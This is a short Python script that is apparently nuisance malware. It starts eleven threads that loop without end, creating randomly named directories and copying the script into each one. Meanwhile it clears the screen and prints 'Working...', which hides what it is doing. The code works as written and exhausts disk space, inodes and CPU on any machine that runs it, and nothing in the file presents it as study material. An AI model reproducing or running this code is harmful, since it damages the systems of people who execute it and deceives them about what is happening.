import sys
import os
import random
import string
import subprocess
import threading

SYSTEM_NAME = ""

SCRIPT = sys.argv
NAME = str(SCRIPT[0])



def RandomString(StringLength=32):
	LETTERS = string.ascii_lowercase
	return ''.join(random.choice(LETTERS) for i in range(StringLength))

class Pink(threading.Thread):
	def __init__(self):
		threading.Thread.__init__(self)

	def run(self):

		while True:
			DIR_NAME_P1 = RandomString(32)
			DIR_NAME_P2 = RandomString(32)
			DIR_NAME_P3 = RandomString(32)
			DIR_NAME_P4 = RandomString(32)

			DirectoryName = DIR_NAME_P1+ DIR_NAME_P2 + DIR_NAME_P3 + DIR_NAME_P4
			subprocess.call(['mkdir', DirectoryName])
			subprocess.call(['cp', NAME, DirectoryName])

			subprocess.call(['clear'])	

			print("Working...")

ThreadA = Pink()
ThreadB = Pink()
ThreadC = Pink()
ThreadD = Pink()
ThreadE = Pink()
ThreadF = Pink()
ThreadG = Pink()
ThreadH = Pink()
ThreadJ = Pink()
ThreadK = Pink()
ThreadL = Pink()

ThreadA.start()
ThreadB.start()
ThreadC.start()
ThreadD.start()
ThreadE.start()
ThreadF.start()
ThreadG.start()
ThreadH.start()
ThreadJ.start()
ThreadK.start()
ThreadL.start()

